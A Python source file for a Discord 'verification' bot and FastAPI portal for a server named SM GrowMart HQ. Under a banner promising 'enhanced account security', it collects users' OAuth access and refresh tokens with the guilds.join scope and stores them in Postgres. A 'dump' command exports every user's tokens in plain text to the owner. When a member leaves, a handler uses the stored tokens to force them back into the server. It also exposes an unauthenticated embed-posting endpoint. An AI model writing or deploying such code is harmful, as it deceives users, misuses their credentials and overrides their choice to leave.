import os
import asyncio
import logging
from datetime import datetime
from typing import Optional
import urllib.parse

from fastapi import FastAPI, Request, Query, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
import httpx
import uvicorn
import discord
from discord.ext import commands
import psycopg2
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("DiscordVerifier")

# Secrets and Configuration
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
REDIRECT_URI = "https://verify.digamber.in/callback"
GUILD_ID = os.getenv("GUILD_ID")  # Discord Server ID
ROLE_ID = os.getenv("VERIFIED_ROLE_ID")  # Role to assign on verification
DATABASE_URL = os.getenv("DATABASE_URL")  # Postgres URL from Render

OAUTH_SCOPES = "identify email guilds.join"

from contextlib import asynccontextmanager

# Initialize FastAPI App
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Database initialization
    init_db()
    
    # Run discord client in background
    if DISCORD_TOKEN:
        asyncio.create_task(bot.start(DISCORD_TOKEN))
        logger.info("Discord Bot client started in background task.")
    else:
        logger.error("DISCORD_TOKEN environment variable is missing!")
    yield

app = FastAPI(title="SM GrowMart HQ Verification Portal", lifespan=lifespan)

# Convert legacy postgres:// to postgresql:// if needed for psycopg2
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# Initialize Database Tables
def init_db():
    if not DATABASE_URL:
        logger.warning("DATABASE_URL not set. Running in-memory mode (restarts will clear session records).")
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        # Table for storing user details
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                discord_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100) NOT NULL,
                access_token TEXT,
                refresh_token TEXT,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Successfully initialized PostgreSQL tables.")
    except Exception as e:
        logger.error(f"Error initializing database: {e}")

# Save Verification Data
def save_verification(discord_id: str, username: str, access_token: str, refresh_token: str):
    if not DATABASE_URL:
        return
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO verified_users (discord_id, username, access_token, refresh_token, verified_at)
            VALUES (%s, %s, %s, %s, NOW())
            ON CONFLICT (discord_id) DO UPDATE SET
                username = EXCLUDED.username,
                access_token = EXCLUDED.access_token,
                refresh_token = EXCLUDED.refresh_token,
                verified_at = NOW();
        """, (discord_id, username, access_token, refresh_token))
        conn.commit()
        cur.close()
        conn.close()
        logger.info(f"Saved/Updated user {username} ({discord_id}) in the database.")
    except Exception as e:
        logger.error(f"Failed to write verification to DB: {e}")

def get_user_tokens(discord_id: str):
    if not DATABASE_URL:
        return None, None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT access_token, refresh_token FROM verified_users WHERE discord_id = %s", (str(discord_id),))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1]
    except Exception as e:
        logger.error(f"DB Read Error: {e}")
    return None, None

async def refresh_access_token(discord_id: str, refresh_token: str):
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": CLIENT_ID or "",
        "client_secret": CLIENT_SECRET or "",
        "grant_type": "refresh_token",
        "refresh_token": refresh_token
    }
    async with httpx.AsyncClient() as client:
        resp = await client.post(token_url, data=data, headers=headers)
        if resp.status_code == 200:
            token_data = resp.json()
            new_acc = token_data.get("access_token")
            new_ref = token_data.get("refresh_token")
            try:
                conn = psycopg2.connect(DATABASE_URL)
                cur = conn.cursor()
                cur.execute("UPDATE verified_users SET access_token = %s, refresh_token = %s WHERE discord_id = %s", (new_acc, new_ref, str(discord_id)))
                conn.commit()
                cur.close()
                conn.close()
                logger.info(f"Successfully refreshed and stored token for user {discord_id}")
            except Exception as e:
                logger.error(f"Failed to store refreshed token for {discord_id}: {e}")
            return new_acc
        else:
            logger.error(f"Failed to refresh token: {resp.text}")
    return None

# Initialize Discord Bot client
intents = discord.Intents.default()
intents.members = True  # Required to edit user roles
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Run discord.py bot alongside FastAPI in asyncio

async def dispatch_premium_embed(channel_id: int):
    channel = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
    if not channel:
        raise Exception("Channel not found on server or bot has no permission directly.")

    # Build beautiful premium interactive embed
    embed = discord.Embed(
        color=discord.Color.from_rgb(43, 45, 49), # Matches seamless Discord dark block background
        description=(
            "<:insane:1399760780009672734> **SM GrowMart HQ**\n\n"
            "<a:emoji_421:1430254423971594451> Secure your access and unlock the complete server experience.\n\n"
            "<a:emoji_38:1410748094420750406>  **Verified Members Receive**\n"
            "> <a:features:1408543952671346768> Instant role assignment\n"
            "> <a:features:1408543952671346768> Exclusive channels unlocked\n"
            "> <a:features:1408543952671346768> Enhanced account security\n\n"
            "📖 **Need Help?** [Read the Verification Guide Here](https://verify.digamber.in/guide)\n\n"
            "-# <a:emoji_27:1410746704537587752>  Secure OAuth authorization required for verification."
        )
    )
    
    # Generate OAuth URL
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    
    # Add beautiful button linking authorization
    button = discord.ui.Button(
        label="Verify Identity Now",
        url=auth_url,
        style=discord.ButtonStyle.link,
        emoji=discord.PartialEmoji(name="verified", id=1408545305594433546, animated=True)
    )
    
    view = discord.ui.View()
    view.add_item(button)
    
    await channel.send(embed=embed, view=view)


@bot.event
async def on_ready():
    logger.info(f"Discord Bot online as {bot.user}")
    try:
        synced = await bot.tree.sync()
        logger.info(f"Synced {len(synced)} command(s)")
    except Exception as e:
        logger.error(f"Failed to sync commands: {e}")

@bot.tree.command(name="dump", description="Dump user data (Owner only)")
async def dump_data(interaction: discord.Interaction):
    # Check if the user is the owner
    allowed = await bot.is_owner(interaction.user)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(interaction.user.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        await interaction.response.send_message("You are not authorized to use this command.", ephemeral=True)
        return

    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT discord_id, username, verified_at, access_token, refresh_token FROM verified_users")
        rows = cur.fetchall()
        cur.close()
        conn.close()

        if not rows:
            await interaction.response.send_message("No data found in the database.", ephemeral=True)
            return

        import io
        
        output = io.StringIO()
        output.write("==================================================\n")
        output.write("              VERIFIED USERS DUMP                 \n")
        output.write("==================================================\n\n")
        
        for idx, row in enumerate(rows, 1):
            discord_id, username, verified_at, access_token, refresh_token = row
            output.write(f"--- User {idx} ---\n")
            output.write(f"Discord ID    : {discord_id}\n")
            output.write(f"Username      : {username}\n")
            output.write(f"Verified At   : {verified_at}\n")
            output.write(f"Access Token  : {access_token}\n")
            output.write(f"Refresh Token : {refresh_token}\n")
            output.write("\n")
        
        output.seek(0)
        file = discord.File(fp=io.BytesIO(output.getvalue().encode('utf-8')), filename="database_dump.txt")
        await interaction.response.send_message("Here is the database dump:", file=file, ephemeral=True)
        
    except Exception as e:
        logger.error(f"Failed to dump database: {e}")
        await interaction.response.send_message("An error occurred while dumping the database.", ephemeral=True)

@bot.command(name="dump")
async def dump_data_text(ctx: commands.Context):
    # Check if the user is the owner
    allowed = await bot.is_owner(ctx.author)
    
    # Fallback to OWNER_ID environment variable if set
    owner_id_env = os.getenv("OWNER_ID")
    if owner_id_env and str(ctx.author.id) == owner_id_env:
        allowed = True
            
    if not allowed:
        return

    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT discord_id, username, verified_at, access_token, refresh_token FROM verified_users")
        rows = cur.fetchall()
        cur.close()
        conn.close()

        if not rows:
            await ctx.send("No data found in the database.")
            return

        import io
        
        output = io.StringIO()
        output.write("==================================================\n")
        output.write("              VERIFIED USERS DUMP                 \n")
        output.write("==================================================\n\n")
        
        for idx, row in enumerate(rows, 1):
            discord_id, username, verified_at, access_token, refresh_token = row
            output.write(f"--- User {idx} ---\n")
            output.write(f"Discord ID    : {discord_id}\n")
            output.write(f"Username      : {username}\n")
            output.write(f"Verified At   : {verified_at}\n")
            output.write(f"Access Token  : {access_token}\n")
            output.write(f"Refresh Token : {refresh_token}\n")
            output.write("\n")
        
        output.seek(0)
        file = discord.File(fp=io.BytesIO(output.getvalue().encode('utf-8')), filename="database_dump.txt")
        await ctx.send("Here is the database dump:", file=file)
        
    except Exception as e:
        logger.error(f"Failed to dump database: {e}")
        await ctx.send("An error occurred while dumping the database.")

@bot.event
async def on_member_remove(member):
    # Retrieve user tokens
    acc, ref = get_user_tokens(str(member.id))
    if not acc:
        logger.info(f"User {member.id} left but no tokens found.")
        return
        
    logger.info(f"User {member.id} left. Attempting auto-join...")
    if not GUILD_ID or not DISCORD_TOKEN:
        return
        
    url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{member.id}"
    headers = {
        "Authorization": f"Bot {DISCORD_TOKEN}",
        "Content-Type": "application/json"
    }

    async def attempt_join(token):
        payload = {"access_token": token}
        async with httpx.AsyncClient() as client:
            return await client.put(url, headers=headers, json=payload)

    resp = await attempt_join(acc)
    
    if resp.status_code == 401 and ref:
        logger.info(f"Token expired for user {member.id}. Attempting refresh.")
        new_acc = await refresh_access_token(str(member.id), ref)
        if new_acc:
            resp = await attempt_join(new_acc)

    if resp.status_code in [201, 204]:
        logger.info(f"Successfully auto-joined user {member.id} back into the server.")
        
        # Re-assign the verified role if not added by join
        if ROLE_ID:
            role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{member.id}/roles/{ROLE_ID}"
            async with httpx.AsyncClient() as client:
                await client.put(role_url, headers=headers)
    else:
        logger.error(f"Failed to auto-join user {member.id}. Status: {resp.status_code}, Resp: {resp.text}")

import os

def load_template(filename: str) -> str:
    path = os.path.join(os.path.dirname(__file__), "templates", filename)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()

# HTML Templates loaded from files for smooth premium UI response
SUCCESS_HTML = load_template("success.html")
ERROR_HTML = load_template("error.html")
GUIDE_HTML = load_template("guide.html")
HOME_HTML = load_template("home.html")


def render_error(error_title="", error_detail="", retry_url=""):
    return ERROR_HTML.replace("{error_title}", str(error_title)).replace("{error_detail}", str(error_detail)).replace("{retry_url}", str(retry_url))

def render_success(username=""):
    return SUCCESS_HTML.replace("{username}", str(username))


# Home page / portal landing index
@app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def home_page():
    # Generate the OAuth authorize URL dynamically
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return HTMLResponse(content=HOME_HTML.replace("{{auth_url}}", auth_url))

# Guide Page
@app.api_route("/guide", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def guide_page():
    return HTMLResponse(content=GUIDE_HTML)

# OAuth2 Redirect / callback route
@app.get("/callback", response_class=HTMLResponse)
async def callback_handler(code: Optional[str] = None):
    # Prepare authorization oauth retry reference link
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES
    }
    retry_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"

    if not code:
        return HTMLResponse(
            content=render_error(
                error_title="Authorization Cancelled",
                error_detail="We could not receive your verified identity tokens because you declined the authorisation popup request. Access permissions could not be validated.",
                retry_url=retry_url
            ),
            status_code=400
        )

    if not CLIENT_ID or not CLIENT_SECRET or not REDIRECT_URI:
        return HTMLResponse(
            content=render_error(
                error_title="OAuth System Misconfiguration",
                error_detail="Bot owner has not registered DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, or DISCORD_REDIRECT_URI environment parameters on Render environment space.",
                retry_url=retry_url
            ),
            status_code=500
        )

    # Exchange Authorization Code for Token
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }

    async with httpx.AsyncClient() as client:
        try:
            # 1. Post request key exchange
            token_response = await client.post(token_url, data=data, headers=headers)
            if token_response.status_code != 200:
                logger.error(f"Token exchange failed: {token_response.text}")
                return HTMLResponse(
                    content=render_error(
                        error_title="OAuth Token Exchange Error",
                        error_detail=f"Failed to fetch security credentials from Discord API services: {token_response.json().get('error_description', 'Invalid Code Parameter')}",
                        retry_url=retry_url
                    ),
                    status_code=400
                )
            
            token_data = token_response.json()
            access_token = token_data.get("access_token")
            refresh_token = token_data.get("refresh_token")

            # 2. Get User Profile info database query matching
            user_response = await client.get(
                "https://discord.com/api/users/@me",
                headers={"Authorization": f"Bearer {access_token}"}
            )

            if user_response.status_code != 200:
                return HTMLResponse(
                    content=render_error(
                        error_title="Identity Extraction Refused",
                        error_detail="Discord successfully generated authorization credentials but restricted profile query reading permission limits.",
                        retry_url=retry_url
                    ),
                    status_code=400
                )

            user_data = user_response.json()
            discord_id = user_data.get("id")
            username = user_data.get("username")

            # 3. Dynamic server role assign action!
            if not GUILD_ID or not ROLE_ID:
                return HTMLResponse(
                    content=render_error(
                        error_title="Deployment Targets Missing",
                        error_detail="Target server (GUILD_ID) and reward category (VERIFIED_ROLE_ID) are missing from bot application configuration parameters.",
                        retry_url=retry_url
                    ),
                    status_code=500
                )

            # Wait for bot client setup loop to connect safely
            if not bot.is_ready():
                return HTMLResponse(
                    content=render_error(
                        error_title="Gateway Bot Standby",
                        error_detail="The connection loop bot backend instance is starting up on the container. Reload or attempt authorization again to let system sync.",
                        retry_url=retry_url
                    ),
                    status_code=503
                )

            guild = bot.get_guild(int(GUILD_ID))
            if not guild:
                # Fallback if guild is not cached
                guild = await bot.fetch_guild(int(GUILD_ID))

            if not guild:
                return HTMLResponse(
                    content=render_error(
                        error_title="Target Server Lost",
                        error_detail="The Discord BOT is not present in the specified server, or target GUILD_ID configurations point to an invalid guild resource reference.",
                        retry_url=retry_url
                    ),
                    status_code=404
                )

            member = guild.get_member(int(discord_id))
            if not member:
                # Fetch member dynamically to avoid cache limitations
                try:
                    member = await guild.fetch_member(int(discord_id))
                except Exception as e:
                    # User is not a member of the guild, try adding them automatically
                    # since we have the guilds.join scope authorized
                    try:
                        add_member_url = f"https://discord.com/api/guilds/{GUILD_ID}/members/{discord_id}"
                        add_headers = {
                            "Authorization": f"Bot {DISCORD_TOKEN}",
                            "Content-Type": "application/json"
                        }
                        add_data = {"access_token": access_token}
                        # Add user to server instantly
                        add_resp = await client.put(add_member_url, json=add_data, headers=add_headers)
                        if add_resp.status_code in [201, 204]:
                            # Wait a brief moment to let guild sync and fetch member
                            await asyncio.sleep(1)
                            member = await guild.fetch_member(int(discord_id))
                        else:
                            return HTMLResponse(
                                content=render_error(
                                    error_title="Not in Server",
                                    error_detail="To secure a Verified role status, make sure you are actively logged into the matching Discord Server group first, then access authorization.",
                                    retry_url=retry_url
                                ),
                                status_code=400
                            )
                    except Exception as join_err:
                        return HTMLResponse(
                            content=render_error(
                                error_title="Failed to Auto-Add User",
                                error_detail="We could not join you to the server using OAuth. Please join SM GrowMart HQ server first, then tap Verify.",
                                retry_url=retry_url
                            ),
                            status_code=400
                        )

            role = guild.get_role(int(ROLE_ID))
            if not role:
                return HTMLResponse(
                    content=render_error(
                        error_title="Verified Role Missing",
                        error_detail=f"The role with ID {ROLE_ID} was not found on your Guild. Ensure the Bot possesses administrator access over this role tier.",
                        retry_url=retry_url
                    ),
                    status_code=404
                )

            # Assign Verified role
            try:
                await member.add_roles(role)
                logger.info(f"Verified & assigned role to member: {username} ({discord_id})")
            except discord.errors.Forbidden:
                logger.error(f"Missing Permissions to assign role {ROLE_ID} to user {discord_id}")
                return HTMLResponse(
                    content=render_error(
                        error_title="Role Assignment Failed",
                        error_detail=(
                            "The bot doesn't have permission to assign the Verified role. "
                            "Please ask the server admin to ensure the bot's role has 'Manage Roles' "
                            "permission and is placed **HIGHER** than the role it is trying to assign in the Discord Server Settings."
                        ),
                        retry_url=retry_url
                    ),
                    status_code=403
                )
            except Exception as e:
                logger.error(f"Failed to assign role {ROLE_ID} to user {discord_id}: {e}")
                
            # 4. Save information into database securely (Render PostgreSQL)
            save_verification(discord_id=discord_id, username=username, access_token=access_token, refresh_token=refresh_token)

            return HTMLResponse(
                content=render_success(username=username),
                status_code=200
            )

        except Exception as e:
            logger.exception("Inbound verification execution system error")
            return HTMLResponse(
                content=render_error(
                    error_title="Service Exception Error",
                    error_detail=f"An unhandled execution crash occurred during your transaction sequence: {str(e)}",
                    retry_url=retry_url
                ),
                status_code=500
            )


# -------------------------------------------------------------
# Trigger Panel Setup (Termux / API POST)
# -------------------------------------------------------------

@app.post("/api/send-embed")
async def send_verification_embed(channel_id: str):
    """ Allows triggering the setup via Termux/CURL (POST request) """
    if not bot.is_ready():
        raise HTTPException(status_code=503, detail="Gateway bot client connecting runtime standby...")
    
    try:
        await dispatch_premium_embed(int(channel_id))
        return {"success": True, "message": "Embed dispatch completed successfully via Termux/POST!"}
    
    except Exception as e:
        logger.exception("Embed dispatch crash event via POST")
        raise HTTPException(status_code=500, detail=f"Inbound processing failed: {str(e)}")

# Launch application
if __name__ == "__main__":
    port = int(os.getenv("PORT", 3000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=True)
